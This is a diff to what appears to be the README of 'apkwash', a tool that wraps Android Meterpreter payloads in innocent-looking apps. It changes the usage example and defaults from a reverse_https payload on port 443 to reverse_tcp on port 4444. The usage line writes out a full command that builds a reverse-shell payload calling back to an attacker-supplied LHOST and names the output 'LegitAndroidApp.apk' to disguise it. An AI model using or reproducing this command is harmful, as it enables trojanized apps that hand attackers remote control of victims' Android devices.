@@ -16,15 +16,15 @@ mv apkwash $PREFIX/bin/.<br>
 <br>
 <br>
 <b>Usage Example:</b><br>
-apkwash -p android/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -o LegitAndroidApp.apk<br>
+apkwash -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o LegitAndroidApp.apk<br>
 <br>
 <b>Output:</b><br>
 \<LegitAndroidApp>.apk & \<LegitAndroidApp>.listener<br>
 <br>
 <b>Default values:</b><br>
-	payload=android/meterpreter/reverse_https<br>
+	payload=android/meterpreter/reverse_tcp<br>
 	LHOST=\<eth0 IP address><br>
-	LPORT=443<br>
+	LPORT=4444<br>
 	output=AndroidService.apk<br>
 <br>
 <b>Options</b><br>
